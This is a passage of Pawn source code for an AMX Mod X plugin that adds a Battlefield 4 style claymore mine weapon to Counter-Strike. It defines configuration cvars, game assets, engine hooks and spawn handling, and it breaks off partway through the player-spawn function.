#include <amxmodx>
#include <amxmisc>
#include <cstrike>
#include <csx>
#include <fun>
#include <engine>
#include <fakemeta>
#include <hamsandwich>
#include <xs>
#include <beams>
#include <customentdata>
#include <bf4natives>
//=====================================
//  VERSION CHECK
//=====================================
#if AMXX_VERSION_NUM < 190
	#assert "AMX Mod X v1.9.0 or Higher library required!"
#endif

#pragma compress 						1
#pragma semicolon 						1
#pragma tabsize 						4

// ==============================================================
// COMMON DEFINES.
// ==============================================================
#if !defined MAX_PLAYERS
	#define  MAX_PLAYERS	          	32
#endif
#if !defined MAX_NAME_LENGTH
	#define  MAX_NAME_LENGTH			32
#endif
#define XTRA_OFS_WEAPON					4
#define XTRA_OFS_PLAYER					5
#define m_fKnown						44
#define m_flNextPrimaryAttack			46
#define m_flNextSecondaryAttack			47
#define m_flTimeWeaponIdle				48
#define m_iPrimaryAmmoType				49
#define m_iClip							51

// ==============================================================
// PLUGIN DEFINES.
// ==============================================================
#define TASK_PLANT						315100
#define TASK_RESET						315500
#define TASK_RELEASE					315900
#define MAX_EXPLOSION_DECALS 			3
#define MAX_BLOOD_DECALS 				10

// ==============================================================
// CONST STRINGS.
// ==============================================================
// PLUGIN INFO. -------------------------------------------------
static const PLUGIN_NAME				[] = "BF4 Weapons - Claymore";
static const PLUGIN_AUTHOR				[] = "Aoi.Kagase";
static const PLUGIN_VERSION				[] = "0.1";
static const CVAR_TAG					[] = "bf4_wpn_cm";

// CED KEYS. ---------------------------------------------------->
static const CM_OWNER					[] = "CED_CM_I_OWNER";
static const CM_STEP					[] = "CED_CM_I_STEP";
static const CM_DECALS					[] = "CED_CM_V_DECALS";
static const CM_POWERUP					[] = "CED_CM_F_POWERUP";
static const CM_WIRE_SPOINT				[] = "CED_CM_V_WIRE_START";
static const CM_WIRE_EPOINT 			[][] = 
{
	"CED_CM_V_WIRE_END_1",
	"CED_CM_V_WIRE_END_2",
	"CED_CM_V_WIRE_END_3",
};
static const CM_WIRE_ENTID				[][] = 
{
	"CED_CM_ENTID_1",
	"CED_CM_ENTID_2",
	"CED_CM_ENTID_3",
};
// CED KEYS. ----------------------------------------------------<

// PLUGIN LOGIC. ------------------------------------------------>
#define IsPlayer(%1) 						( 1 <= %1 <= 32 ) 
#define mines_get_health(%1,%2)				pev(%1, pev_health, %2)
#define mines_set_health(%1,%2)				set_pev(%1, pev_health, %2)
#define mines_get_user_frags(%1)			pev(%1,pev_frags)
#define mines_set_user_frags(%1,%2)			set_pev(%1,pev_frags,%2)
#define mines_get_user_max_speed(%1,%2)		pev(%1,pev_maxspeed,%2)
#define mines_set_user_max_speed(%1,%2)		engfunc(EngFunc_SetClientMaxspeed,%1,%2);set_pev(%1, pev_maxspeed,%2)
#define mines_get_user_deploy_state(%1)		gCPlayerData[%1][PL_STATE_DEPLOY]
#define mines_set_user_deploy_state(%1,%2)	gCPlayerData[%1][PL_STATE_DEPLOY] = %2
#define mines_load_user_max_speed(%1)		gCPlayerData[%1][PL_MAX_SPEED]
#define mines_save_user_max_speed(%1,%2)	gCPlayerData[%1][PL_MAX_SPEED] = Float:%2
// PLUGIN LOGIC. ------------------------------------------------<

//#define ENT_SPRITE1 				"sprites/mines/claymore_wire.spr"

// RESOURCES. --------------------------------------------------->
enum _:E_SOUNDS
{
	SND_CM_DRAW,
	SND_CM_ATTACK,
	SND_CM_EXPLOSION,
//	SND_CM_DRAW_OFF,
//  SND_CM_TRIGGER_OFF,
//  SND_CM_TRIGGER_ON,
//  SND_CM_TRIGGER_SHOOT_ON,

	SND_CM_DEPLOY,
	SND_CM_WIRE_WALLHIT,

	SND_EQUIP,
	SND_PICKUP,
	SND_BUTTON,
	SND_GLASS_1,
	SND_GLASS_2,
};

static const ENT_SOUNDS[E_SOUNDS][] = 
{
	"bf4_ranks/weapons/claymore_draw.wav",
	"bf4_ranks/weapons/claymore_shoot.wav",
	"bf4_ranks/weapons/claymore_explosion.wav",
	// "bf4_ranks/weapons/claymore_draw_off.wav",
	// "bf4_ranks/weapons/claymore_trigger_off.wav",
	// "bf4_ranks/weapons/claymore_trigger_on.wav",
	// "bf4_ranks/weapons/claymore_trigger_shoot_on.wav",

	"bf4_ranks/weapons/claymore_deploy.wav",
	"bf4_ranks/weapons/claymore_wallhit.wav",

	"items/ammopickup2.wav",
	"items/gunpickup2.wav"		,		// 0: PICKUP
	"items/gunpickup4.wav"		,		// 1: PICKUP (BUTTON)
	"debris/bustglass1.wav"		,		// 2: GLASS
	"debris/bustglass2.wav"				// 3: GLASS	
};

enum _:E_MODELS
{
	V_WPN,
	W_WPN,
	P_WPN,
};
new const ENT_MODELS[E_MODELS][] = 
{
	"models/bf4_ranks/weapons/v_claymore.mdl",
	"models/bf4_ranks/weapons/w_claymore.mdl",
	"models/bf4_ranks/weapons/p_claymore.mdl",
};

enum _:E_SPRITES
{
	SPR_WPN_SELECT,
	SPR_WIRE,

	SPR_EXPLOSION_1			,
	SPR_EXPLOSION_2			,
	SPR_EXPLOSION_WATER		,
	SPR_BLAST				,
	SPR_SMOKE				,
	SPR_BUBBLE				,
	SPR_BLOOD_SPLASH		,
	SPR_BLOOD_SPRAY			,

};
new const ENT_SPRITES[E_SPRITES][] =
{
	"sprites/bf4_ranks/weapons/weapon_claymore.spr",
	"sprites/bf4_ranks/weapons/claymore_wire.spr",

	"sprites/fexplo.spr"		,		// 0: EXPLOSION
	"sprites/eexplo.spr"		,		// 1: EXPLOSION
	"sprites/WXplo1.spr"		,		// 2: WATER EXPLOSION
	"sprites/blast.spr"			,		// 3: BLAST
	"sprites/steam1.spr"		,		// 4: SMOKE
	"sprites/bubble.spr"		,		// 5: BUBBLE
	"sprites/blood.spr"			,		// 6: BLOOD SPLASH
	"sprites/bloodspray.spr"			// 7: BLOOD SPRAY
};

enum _:E_CLASS_NAME
{
	I_TARGET,
	F_BREAKABLE,
	WPN_C4,
	WPN_CLAYMORE,
};


enum _:E_MESSAGES
{
	MSG_WEAPONLIST,
	MSG_BARTIME,
	MSG_TEXTMSG,
}

enum _:E_SEQUENCE
{
	SEQ_IDLE,
	SEQ_SHOOT,
	SEQ_DRAW,
	SEQ_IDLE_TRIGGER_ON,
	SEQ_IDLE_TRIGGER_OFF,
	SEQ_TRIGGGER_ON,
	SEQ_TRIGGGER_OFF,
	SEQ_TRGGGER_SHOOT_ON,
	SEQ_TRIGGER_SHOOT_OFF,
	SEQ_TRIGGER_DRAW_ON,
	SEQ_TRIGGER_DRAW_OFF,
}

enum _:COMMON_MINES_DATA
{
	AMMO_HAVE_START			,
	AMMO_HAVE_MAX			,
	NO_ROUND				,
	DEPLOY_MAX				,
	DEPLOY_TEAM_MAX			,
	DEPLOY_POSITION			,	// FLY, GROUND, WALL
	BUY_MODE				,
	BUY_PRICE				,
	BUY_ZONE				,
	CsTeams:BUY_TEAM		,
	FRAG_MONEY				,
	MINES_BROKEN			,
	ALLOW_PICKUP			,
	DEATH_REMOVE			,
	GLOW_ENABLE				,
	GLOW_MODE				,
	GLOW_COLOR_TR			,
	GLOW_COLOR_CT			,
	Float:ACTIVATE_TIME		,
	Float:MINE_HEALTH		,
	Float:EXPLODE_RADIUS	,
	Float:EXPLODE_DAMAGE	,
	EXPLODE_SPRITE1			,
	EXPLODE_SPRITE2			,
	EXPLODE_SPRITE_BLAST	,
	EXPLODE_SPRITE_SMOKE	,
	EXPLODE_SPRITE_WATER	,
	EXPLODE_SPRITE_BUBBLE	,
	BLOOD_SPLASH			,
	BLOOD_SPRAY				,
}

enum _:COMMON_PLAYER_DATA
{
	int:PL_STATE_DEPLOY		,
	Float:PL_MAX_SPEED		,
	Float:PL_DEPLOY_POS[3]	,
}

enum int:PLAYER_DEPLOY_STATE
{
	STATE_IDLE				= 0,
	STATE_DEPLOYING			,
	STATE_PICKING			,
	STATE_DEPLOYED			,
}

new const MESSAGES[E_MESSAGES][] = 
{
	"WeaponList",
	"BarTime",
	"TextMsg",
};

new const ENTITY_CLASS_NAME[E_CLASS_NAME][MAX_NAME_LENGTH] = 
{
	"info_target",
	"func_breakable",
	"weapon_c4",
	"weapon_claymore"
};


enum _:PICKUP_MODE
{
	DISALLOW_PICKUP			= 0,
	ONLY_ME					,
	ALLOW_FRIENDLY			,
	ALLOW_ENEMY				,
}
//
// PLAYER DATA AREA
//
enum _:PLAYER_DATA
{
	int:PL_COUNT_DELAY		= 0,
	int:PL_COUNT_DEPLOYED	,
}
enum _:TRIPMINE_THINK
{
	POWERUP_THINK			= 0,
	BEAMUP_THINK			,
	BEAMBREAK_THINK			,
	EXPLOSE_THINK			,
};
enum _:TRIPMINE_SOUND
{
	SOUND_POWERUP			= 0,
	SOUND_ACTIVATE			,
	SOUND_STOP				,
	SOUND_PICKUP			,
	SOUND_HIT				,
	SOUND_HIT_SHIELD		,
};

//
// CVAR SETTINGS
//
enum _:E_CVARS
{
	CVAR_ENABLE				= 0,    // Plugin Enable.
//	CVAR_ACCESS_LEVEL		,		// Access level for 0 = ADMIN or 1 = ALL.
	CVAR_NOROUND			,		// Check Started Round.
	CVAR_CMD_MODE			,    	// 0 = +USE key, 1 = bind, 2 = each.
	CVAR_FRIENDLY_FIRE		,		// Friendly Fire.
	CVAR_START_DELAY        ,   	// Round start delay time.

	CVAR_MAX_HAVE			,    	// Max having ammo.
	CVAR_START_HAVE			,    	// Start having ammo.
	CVAR_FRAG_MONEY         ,    	// Get money per kill.
	CVAR_COST               ,    	// Buy cost.
	CVAR_BUY_ZONE           ,    	// Stay in buy zone can buy.
	CVAR_MAX_DEPLOY			,		// user max deploy.
	CVAR_TEAM_MAX           ,    	// Max deployed in team.
	Float:CVAR_EXPLODE_RADIUS     ,   	// Explosion Radius.
	Float:CVAR_EXPLODE_DMG        ,   	// Explosion Damage.
	CVAR_FRIENDLY_FIRE      ,   	// Friendly Fire.
	CVAR_CBT[4]             ,   	// Can buy team. TR/CT/ALL
	CVAR_BUY_MODE           ,   	// Buy mode. 0 = off, 1 = on.
	Float:CVAR_MINE_HEALTH  ,   	// Claymore health. (Can break.)
	CVAR_MINE_GLOW          ,   	// Glowing tripmine.
	CVAR_MINE_GLOW_MODE     ,   	// Glowing color mode.
	CVAR_MINE_GLOW_CT [13]    	,   	// Glowing color for CT.
	CVAR_MINE_GLOW_TR [13]   	,   	// Glowing color for T.
	CVAR_MINE_BROKEN		,		// Can Broken Mines. 0 = Mine, 1 = Team, 2 = Enemy.
	CVAR_MINE_OFFSET_ANGLE	[20],		// MODEL OFFSET ANGLE
	CVAR_MINE_OFFSET_POS	[20],		// MODEL OFFSET POSITION
	CVAR_DEATH_REMOVE		,		// Dead Player Remove Claymore.
	Float:CVAR_CM_ACTIVATE	,		// Waiting for put claymore. (0 = no progress bar.)
	CVAR_ALLOW_PICKUP		,		// allow pickup.
	Float:CVAR_CM_WIRE_RANGE		,		// Claymore Wire Range.
	Float:CVAR_CM_WIRE_WIDTH		,		// Claymore Wire Width.
	CVAR_CM_CENTER_PITCH	[20],		// Claymore Wire Area Center Pitch.
	CVAR_CM_CENTER_YAW		[20],		// Claymore Wire Area Center Yaw.
	CVAR_CM_LEFT_PITCH		[20],		// Claymore Wire Area Left Pitch.
	CVAR_CM_LEFT_YAW		[20],		// Claymore Wire Area Left Yaw.
	CVAR_CM_RIGHT_PITCH		[20],		// Claymore Wire Area Right Pitch.
	CVAR_CM_RIGHT_YAW		[20],		// Claymore Wire Area Right Yaw.
	CVAR_CM_TRIAL_FREQ		,		// Claymore Wire trial frequency.
	CVAR_CM_WIRE_VISIBLE    ,   	// Wire Visiblity. 0 = off, 1 = on.
	Float:CVAR_CM_WIRE_BRIGHT     ,   	// Wire brightness.
	CVAR_CM_WIRE_COLOR		,
	CVAR_CM_WIRE_COLOR_T	[13],
	CVAR_CM_WIRE_COLOR_CT	[13],
	CVAR_MAX_COUNT			,
};

//====================================================
//  Enum Area.
//====================================================
new gPlayerData				[MAX_PLAYERS][PLAYER_DATA];

new gDeployingMines			[MAX_PLAYERS];
new gEntMine;
new gCvar					[E_CVARS];
new g_msg_data				[E_MESSAGES];

new gMinesParameter			[COMMON_MINES_DATA];
new gCPlayerData			[MAX_PLAYERS][COMMON_PLAYER_DATA];
new const Float:gModelMargin[] = {0.0, 0.0, -2.0};
new gSprites				[E_SPRITES];
new gDecalIndexExplosion	[MAX_EXPLOSION_DECALS];
new gDecalIndexBlood		[MAX_BLOOD_DECALS];
new gNumDecalsExplosion;
new gNumDecalsBlood;
new const gWireLoop = 3;
new gMinesCSXID;


//====================================================
//  PLUGIN PRECACHE
//====================================================
public plugin_precache() 
{
	check_plugin();

	for (new i = 0; i < E_SOUNDS; i++)
		precache_sound(ENT_SOUNDS[i]);

	for (new i = 0; i < E_MODELS; i++) 
		precache_model(ENT_MODELS[i]);

	for (new i = 0; i < E_SPRITES; i++)
		precache_model(ENT_SPRITES[i]);

	precache_generic("sprites/weapon_claymore.txt");
	LoadDecals();
	return PLUGIN_CONTINUE;
}

//====================================================
//  PLUGIN INITIALIZE
//====================================================
public plugin_init()
{
	register_plugin		(PLUGIN_NAME, PLUGIN_VERSION, PLUGIN_AUTHOR);
	register_cvar		(PLUGIN_NAME, PLUGIN_VERSION, FCVAR_SPONLY|FCVAR_SERVER);

	bind_pcvar_num		(create_cvar(fmt("%s%s", CVAR_TAG, "_enable"),				"1"),			gCvar[CVAR_ENABLE]);	// 0 = off, 1 = on.
//	bind_pcvar_num		(create_cvar(fmt("%s%s", CVAR_TAG, "_access"),				"0"),			gCvar[CVAR_ACCESS_LEVEL]);	// 0 = all, 1 = admin
	bind_pcvar_num		(create_cvar(fmt("%s%s", CVAR_TAG, "_round_delay"),			"5"),			gCvar[CVAR_START_DELAY]);	// Round start delay time.
	bind_pcvar_num		(get_cvar_pointer("mp_friendlyfire"),										gCvar[CVAR_FRIENDLY_FIRE]);							// Friendly fire. 0 or 1

	// CVar settings.
	// Ammo.
	bind_pcvar_num		(create_cvar(fmt("%s%s", CVAR_TAG, "_amount"),				"1"	),			gCvar[CVAR_START_HAVE]);	// Round start have ammo count.
	bind_pcvar_num		(create_cvar(fmt("%s%s", CVAR_TAG, "_max_amount"),			"2"),			gCvar[CVAR_MAX_HAVE]);		// Max having ammo.
	bind_pcvar_num		(create_cvar(fmt("%s%s", CVAR_TAG, "_team_max"),			"10"),			gCvar[CVAR_TEAM_MAX]);		// Max deployed in team.
	bind_pcvar_num		(create_cvar(fmt("%s%s", CVAR_TAG, "_max_deploy"),			"10"),			gCvar[CVAR_MAX_DEPLOY]);	// Max deployed in user.

	// Buy system.
	bind_pcvar_num		(create_cvar(fmt("%s%s", CVAR_TAG, "_buy_mode"),			"1"),			gCvar[CVAR_BUY_MODE]);		// 0 = off, 1 = on.
	bind_pcvar_string	(create_cvar(fmt("%s%s", CVAR_TAG, "_buy_team"),			"ALL"),			gCvar[CVAR_CBT], 				charsmax(gCvar[CVAR_CBT]));	// Can buy team. TR / CT / ALL. (BIOHAZARD: Z = Zombie)
	bind_pcvar_num		(create_cvar(fmt("%s%s", CVAR_TAG, "_buy_price"),			"2500"),		gCvar[CVAR_COST]);			// Buy cost.
	bind_pcvar_num		(create_cvar(fmt("%s%s", CVAR_TAG, "_buy_zone"),			"1"),			gCvar[CVAR_BUY_ZONE]);		// Stay in buy zone can buy.
	bind_pcvar_num		(create_cvar(fmt("%s%s", CVAR_TAG, "_frag_money"), 			"300"),			gCvar[CVAR_FRAG_MONEY]);	// Get money.

	// Mine design.
	bind_pcvar_num		(create_cvar(fmt("%s%s", CVAR_TAG, "_mine_health"),			"50"),			gCvar[CVAR_MINE_HEALTH]);	// Tripmine Health. (Can break.)
	bind_pcvar_num		(create_cvar(fmt("%s%s", CVAR_TAG, "_mine_glow"),			"0"), 			gCvar[CVAR_MINE_GLOW]);	// Tripmine glowing. 0 = off, 1 = on.
	bind_pcvar_num		(create_cvar(fmt("%s%s", CVAR_TAG, "_mine_glow_color_mode"),"0"),			gCvar[CVAR_MINE_GLOW_MODE]);	// Mine glow coloer 0 = team color, 1 = green.
	bind_pcvar_string	(create_cvar(fmt("%s%s", CVAR_TAG, "_mine_glow_color_t"),	"255,0,0"),		gCvar[CVAR_MINE_GLOW_TR], 		charsmax(gCvar[CVAR_MINE_GLOW_TR]));	// Team-Color for Terrorist. default:red (R,G,B)
	bind_pcvar_string	(create_cvar(fmt("%s%s", CVAR_TAG, "_mine_glow_color_ct"),	"0,0,255"),		gCvar[CVAR_MINE_GLOW_CT], 		charsmax(gCvar[CVAR_MINE_GLOW_CT]));	// Team-Color for Counter-Terrorist. default:blue (R,G,B)
	bind_pcvar_num		(create_cvar(fmt("%s%s", CVAR_TAG, "_mine_broken"),			"2"),			gCvar[CVAR_MINE_BROKEN]);	// Can broken Mines.(0 = mines, 1 = Team, 2 = Enemy)
	bind_pcvar_float	(create_cvar(fmt("%s%s", CVAR_TAG, "_explode_radius"),		"320.0"	),		gCvar[CVAR_EXPLODE_RADIUS]);	// Explosion radius.
	bind_pcvar_float	(create_cvar(fmt("%s%s", CVAR_TAG, "_explode_damage"),		"400"),			gCvar[CVAR_EXPLODE_DMG]);	// Explosion radius damage.

	// Misc Settings.
	bind_pcvar_num		(create_cvar(fmt("%s%s", CVAR_TAG, "_death_remove"),		"0"),			gCvar[CVAR_DEATH_REMOVE]);	// Dead Player remove claymore. 0 = off, 1 = on.
	bind_pcvar_float	(create_cvar(fmt("%s%s", CVAR_TAG, "_activate_time"),		"3.0"),			gCvar[CVAR_CM_ACTIVATE]);	// Waiting for put claymore. (int:seconds. 0 = no progress bar.)
	bind_pcvar_num		(create_cvar(fmt("%s%s", CVAR_TAG, "_allow_pickup"),		"1"),			gCvar[CVAR_ALLOW_PICKUP]);	// allow pickup mine. (0 = disable, 1 = it's mine, 2 = allow friendly mine, 3 = allow enemy mine!)

	// Claymore Settings. (Color is Laser color)
	bind_pcvar_num		(create_cvar(fmt("%s%s", CVAR_TAG, "_wire_visible"),		"1"),			gCvar[CVAR_CM_WIRE_VISIBLE]);	// wire visibility.
	bind_pcvar_float	(create_cvar(fmt("%s%s", CVAR_TAG, "_wire_range"),			"300"),			gCvar[CVAR_CM_WIRE_RANGE]);	// wire range.
	bind_pcvar_float	(create_cvar(fmt("%s%s", CVAR_TAG, "_wire_brightness"),		"255"),			gCvar[CVAR_CM_WIRE_BRIGHT]);	// wire brightness.
	bind_pcvar_float	(create_cvar(fmt("%s%s", CVAR_TAG, "_wire_width"),			"2"),			gCvar[CVAR_CM_WIRE_WIDTH]);	// wire width.
	bind_pcvar_string	(create_cvar(fmt("%s%s", CVAR_TAG, "_wire_center_pitch"),	"10,-65"),		gCvar[CVAR_CM_CENTER_PITCH],	charsmax(gCvar[CVAR_CM_CENTER_PITCH]));	// wire area center pitch.
	bind_pcvar_string	(create_cvar(fmt("%s%s", CVAR_TAG, "_wire_center_yaw"),		"45,135"),		gCvar[CVAR_CM_CENTER_YAW],		charsmax(gCvar[CVAR_CM_CENTER_YAW]));	// wire area center yaw.
	bind_pcvar_string	(create_cvar(fmt("%s%s", CVAR_TAG, "_wire_left_pitch"),		"10,-45"),		gCvar[CVAR_CM_LEFT_PITCH],		charsmax(gCvar[CVAR_CM_LEFT_PITCH]));	// wire area left pitch.
	bind_pcvar_string	(create_cvar(fmt("%s%s", CVAR_TAG, "_wire_left_yaw"),		"100,165"),		gCvar[CVAR_CM_LEFT_YAW], 		charsmax(gCvar[CVAR_CM_LEFT_YAW]));	// wire area left yaw.
	bind_pcvar_string	(create_cvar(fmt("%s%s", CVAR_TAG, "_wire_right_pitch"),	"10,-45"),		gCvar[CVAR_CM_RIGHT_PITCH],	 	charsmax(gCvar[CVAR_CM_RIGHT_PITCH]));	// wire area right pitch.
	bind_pcvar_string	(create_cvar(fmt("%s%s", CVAR_TAG, "_wire_right_yaw"),		"15,80"),		gCvar[CVAR_CM_RIGHT_YAW],	 	charsmax(gCvar[CVAR_CM_RIGHT_YAW]));	// wire area right yaw.
	bind_pcvar_num		(create_cvar(fmt("%s%s", CVAR_TAG, "_wire_trial_freq"),		"3"),			gCvar[CVAR_CM_TRIAL_FREQ]);	// wire trial frequency.
	bind_pcvar_num		(create_cvar(fmt("%s%s", CVAR_TAG, "_wire_color_mode"),		"0"),			gCvar[CVAR_CM_WIRE_COLOR]);	// Mine glow coloer 0 = team color, 1 = green.
	bind_pcvar_string	(create_cvar(fmt("%s%s", CVAR_TAG, "_wire_color_t"),		"255,255,255"),	gCvar[CVAR_CM_WIRE_COLOR_T],	charsmax(gCvar[CVAR_CM_WIRE_COLOR_T]));	// Team-Color for Terrorist. default:red (R,G,B)
	bind_pcvar_string	(create_cvar(fmt("%s%s", CVAR_TAG, "_wire_color_ct"),		"255,255,255"),	gCvar[CVAR_CM_WIRE_COLOR_CT],	charsmax(gCvar[CVAR_CM_WIRE_COLOR_CT]));	// Team-Color for Counter-Terrorist. default:blue (R,G,B)
	bind_pcvar_string	(create_cvar(fmt("%s%s", CVAR_TAG, "_offset_angle"), 		"-90,0,0"),		gCvar[CVAR_MINE_OFFSET_ANGLE],	charsmax(gCvar[CVAR_MINE_OFFSET_ANGLE]));
	bind_pcvar_string	(create_cvar(fmt("%s%s", CVAR_TAG, "_offset_position"), 	"0,0,-512"),	gCvar[CVAR_MINE_OFFSET_POS],	charsmax(gCvar[CVAR_MINE_OFFSET_POS]));

	// RegisterHamPlayer	(Ham_Killed,								"PlayerKilled");
	// RegisterHamPlayer	(Ham_Player_PostThink,						"PlayerPostThink");
	RegisterHamPlayer	(Ham_Spawn, 								"PlayerSpawn", 	.Post = true);

//	register_event		("Damage", "OnDamage", "b", "2>0");
	// Register Forward.
	// register_message 	(g_msg_data[MSG_CLCORPSE],					"message_clcorpse");
	// Register Forward.

/// =======================================================================================
/// START Custom Weapon Defibrillator
/// =======================================================================================
    register_clcmd		("weapon_claymore", 		"SelectClaymore");
	RegisterHam			(Ham_Item_ItemSlot, 		ENTITY_CLASS_NAME[WPN_C4], 	"OnItemSlotKnife");
	RegisterHam			(Ham_Item_Deploy, 			ENTITY_CLASS_NAME[WPN_C4], 	"OnSetModels",			.Post = true);
	RegisterHam			(Ham_Weapon_PrimaryAttack, 	ENTITY_CLASS_NAME[WPN_C4], 	"OnPrimaryAttackPre");
	RegisterHam			(Ham_Weapon_PrimaryAttack, 	ENTITY_CLASS_NAME[WPN_C4], 	"OnPrimaryAttackPost",	.Post = true);
	// RegisterHam			(Ham_Weapon_SecondaryAttack,ENTITY_CLASS_NAME[WPN_C4], 	"OnSecondaryAttackPre");
	RegisterHamPlayer	(Ham_TakeDamage,			"OnTakeDamage");
	register_forward	(FM_EmitSound, 				"KnifeSound");
/// =======================================================================================
/// END Custom Weapon Defibrillator
/// =======================================================================================
	// Register Forward.
	register_forward	(FM_CmdStart,				"PlayerCmdStart");
	register_forward	(FM_UpdateClientData, 		"OnUpdateClientDataPost", ._post = true);
/// =======================================================================================
/// START HealthKit
/// =======================================================================================
	RegisterHam			(Ham_Think, 				ENTITY_CLASS_NAME[F_BREAKABLE],	"MinesThink");
/// =======================================================================================
/// END HealthKit
/// =======================================================================================

	for(new i = 0; i < E_MESSAGES; i++)
		g_msg_data[i] = get_user_msgid(MESSAGES[i]);

	register_message(get_user_msgid(MESSAGES[MSG_TEXTMSG]), "Message_TextMsg") ;
	gMinesCSXID = custom_weapon_add(ENTITY_CLASS_NAME[WPN_CLAYMORE], 0, "Claymore");

	update_mines_parameter();
}

update_mines_parameter()
{
	gMinesParameter[AMMO_HAVE_START]=	gCvar[CVAR_START_HAVE];
	gMinesParameter[AMMO_HAVE_MAX]	=	gCvar[CVAR_MAX_HAVE];
	gMinesParameter[DEPLOY_MAX]		=	gCvar[CVAR_MAX_DEPLOY];
	gMinesParameter[DEPLOY_TEAM_MAX]=	gCvar[CVAR_TEAM_MAX];
	gMinesParameter[BUY_MODE]		=	gCvar[CVAR_BUY_MODE];
	gMinesParameter[BUY_ZONE]		=	gCvar[CVAR_BUY_ZONE];
	gMinesParameter[BUY_PRICE]		=	gCvar[CVAR_COST];
	gMinesParameter[FRAG_MONEY]		=	gCvar[CVAR_FRAG_MONEY];
	gMinesParameter[MINES_BROKEN]	=	gCvar[CVAR_MINE_BROKEN];
	gMinesParameter[ALLOW_PICKUP]	=	gCvar[CVAR_ALLOW_PICKUP];
	gMinesParameter[DEATH_REMOVE]	=	gCvar[CVAR_DEATH_REMOVE];
	gMinesParameter[GLOW_ENABLE]	=	gCvar[CVAR_MINE_GLOW];
	gMinesParameter[GLOW_MODE]		=	gCvar[CVAR_MINE_GLOW_MODE];
	gMinesParameter[MINE_HEALTH]	=	_:gCvar[CVAR_MINE_HEALTH];
	gMinesParameter[ACTIVATE_TIME]	=	_:gCvar[CVAR_CM_ACTIVATE];
	gMinesParameter[EXPLODE_RADIUS]	=	_:gCvar[CVAR_EXPLODE_RADIUS];
	gMinesParameter[EXPLODE_DAMAGE]	=	_:gCvar[CVAR_EXPLODE_DMG];
	gMinesParameter[BUY_TEAM] 		=	_:get_team_code(gCvar[CVAR_CBT]);
	gMinesParameter[GLOW_COLOR_TR]	=	get_cvar_to_color(gCvar[CVAR_MINE_GLOW_TR]);
	gMinesParameter[GLOW_COLOR_CT]	=	get_cvar_to_color(gCvar[CVAR_MINE_GLOW_CT]);

	// registered func_breakable
	gEntMine = engfunc(EngFunc_AllocString, ENTITY_CLASS_NAME[F_BREAKABLE]);
}

/// =======================================================================================
/// START Custom Weapon Claymore
/// =======================================================================================
public OnAddToPlayerKnife(const item, const player)
{
    if(pev_valid(item) && is_user_alive(player)) 	// just for safety.
    {
        message_begin( MSG_ONE, g_msg_data[MSG_WEAPONLIST], .player = player );
        {
            write_string("weapon_claymore");  		 // WeaponName
            write_byte(14);                   		// PrimaryAmmoID
            write_byte(1);                  		// PrimaryAmmoMaxAmount
            write_byte(-1);                   		// SecondaryAmmoID
            write_byte(-1);                   		// SecondaryAmmoMaxAmount
            write_byte(4);                    		// SlotID (0...N)
            write_byte(3);                    		// NumberInSlot (1...N)
            write_byte(CSW_C4); 	           		// WeaponID
            write_byte(0);                    		// Flags
        }
        message_end();
    }
}

public SelectClaymore(const client) 
{ 
    engclient_cmd(client, "weapon_c4"); 
} 

public OnItemSlotKnife(const item)
{
    SetHamReturnInteger(5);
    return HAM_SUPERCEDE;
}

public OnSetModels(const item)
{
	if(pev_valid(item) != 2)
		return PLUGIN_CONTINUE;

	static client; client = get_pdata_cbase(item, 41, 4);
	if(!is_user_alive(client))
		return PLUGIN_CONTINUE;

	if(get_pdata_cbase(client, 373) != item)
		return PLUGIN_CONTINUE;

	set_pev(client, pev_viewmodel2, 	ENT_MODELS[V_WPN]);
	set_pev(client, pev_weaponmodel2, 	ENT_MODELS[P_WPN]);

	UTIL_PlayWeaponAnimation(client, SEQ_DRAW);
	emit_sound(client, CHAN_WEAPON, ENT_SOUNDS[SND_CM_DRAW], VOL_NORM, ATTN_NORM, 0, PITCH_NORM);

	return PLUGIN_HANDLED;
}

public OnPrimaryAttackPre(Weapon)
{
	new client = get_pdata_cbase(Weapon, 41, 4);
	
	if (get_pdata_cbase(client, 373) != Weapon)
		return HAM_IGNORED;

	return HAM_HANDLED;
}

public OnPrimaryAttackPost(Weapon)
{
	new client = get_pdata_cbase(Weapon, 41, 4);
	
	if (get_pdata_cbase(client, 373) != Weapon)
		return HAM_IGNORED;

	if (mines_get_user_deploy_state(client) == STATE_IDLE) 
	{
		UTIL_PlayWeaponAnimation(client, SEQ_SHOOT);
		emit_sound(client, CHAN_WEAPON, ENT_SOUNDS[SND_CM_ATTACK], VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
	}
	return HAM_HANDLED;
}

public OnTakeDamage(iVictim, inflictor, iAttacker, Float:damage, damage_type)
{
	// Assist Damage.
	if (is_user_connected(iAttacker) && is_user_connected(iVictim))
	{
//		if (GetBF4PlayerClass(attacker) == BF4_CLASS_ASSAULT)
		{
			if (!pev_valid(inflictor))
				return HAM_IGNORED;

			new classname[32];
			pev(inflictor, pev_classname, classname, charsmax(classname));

			if (!equali(classname, ENTITY_CLASS_NAME[WPN_CLAYMORE]))
				return HAM_IGNORED;


			if (!is_user_alive(iVictim))
				return HAM_IGNORED;

			new health = get_user_health(iVictim);
			if (health - damage > 0.0)
				return HAM_IGNORED;

			// Get Target Team.
			new CsTeams:aTeam = cs_get_user_team(iAttacker);
			new CsTeams:vTeam = cs_get_user_team(iVictim);

			new score  = (vTeam != aTeam) ? 1 : -1;
			new tDeath = cs_get_user_deaths(iVictim);
			cs_set_user_deaths(iVictim, tDeath);

			// Get Money attacker.
			new money  = 300 * score;
			cs_set_user_money(iAttacker, cs_get_user_money(iAttacker) + money);

			return HAM_HANDLED;
		}
	}
	return HAM_IGNORED;
}

public OnUpdateClientDataPost(Player, SendWeapons, CD_Handle)
{
	if(!is_user_alive(Player) || (cs_get_user_weapon(Player) != CSW_C4))
		return FMRES_IGNORED;
	
	set_cd(CD_Handle, CD_flNextAttack, halflife_time () + 0.001);
	return FMRES_HANDLED;
}

stock UTIL_PlayWeaponAnimation(const Player, const Sequence)
{
	set_pev(Player, pev_weaponanim, Sequence);
	
	message_begin(MSG_ONE_UNRELIABLE, SVC_WEAPONANIM, .player = Player);
	write_byte(Sequence);
	write_byte(pev(Player, pev_body));
	message_end();
}

public PlayerSpawn(id)
{
	// Check Plugin Enabled
	if (!gCvar[CVAR_ENABLE])
		return HAM_IGNORED;

	if (!is_user_connected(id))
		return HAM_IGNORED;
	
	if (is_user_bot(id))
		return HAM_IGNORED;


	if (is_user_alive(id) && pev(id, pev_flags) & (FL_CLIENT))
	{
		give_item(id, "weapon_c4");
		cs_set_user_bpammo(id, CSW_C4, 5);

		// Task Delete.
		delete_task(id);

		// Delay time reset
